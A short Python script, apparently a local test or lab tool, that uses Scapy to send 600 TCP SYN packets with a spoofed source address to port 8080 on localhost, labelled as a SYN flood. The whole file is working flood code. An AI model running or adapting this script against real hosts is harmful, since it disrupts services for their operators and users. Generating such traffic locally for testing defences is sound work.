from scapy.all import IP, TCP, send
import time

# SYN flood to a single destination port
dst = '127.0.0.1'
src = '127.0.0.2'
port = 8080

count = 600
print(f"Sending {count} SYN packets to {dst}:{port} from {src}...")
for i in range(count):
    pkt = IP(dst=dst, src=src)/TCP(dport=port, sport=1024 + (i % 40000), flags='S')
    send(pkt, verbose=False)
    # very small delay to increase packet rate
    time.sleep(0.002)

print('Done')
